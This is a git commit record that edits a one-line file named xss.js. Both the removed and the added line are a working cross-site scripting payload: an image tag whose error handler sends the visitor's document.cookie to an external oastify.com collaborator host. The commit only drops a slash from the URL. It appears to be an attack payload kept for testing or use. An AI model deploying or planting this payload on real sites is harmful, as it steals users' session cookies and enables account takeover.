d3a4b09e9c0cc314f1d23f8ef3e10cfcbe4ed29b
Douglas Rodrigues <39203535+DouglasRao@users.noreply.github.com>
2023-06-24 04:35:39 -0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-<img src=x onerror=this.src='https://ig259tofohiqw67mjcg5bazuclic63us.oastify.com/?'+document.cookie;>
+<img src=x onerror=this.src='https://ig259tofohiqw67mjcg5bazuclic63us.oastify.com?'+document.cookie;>
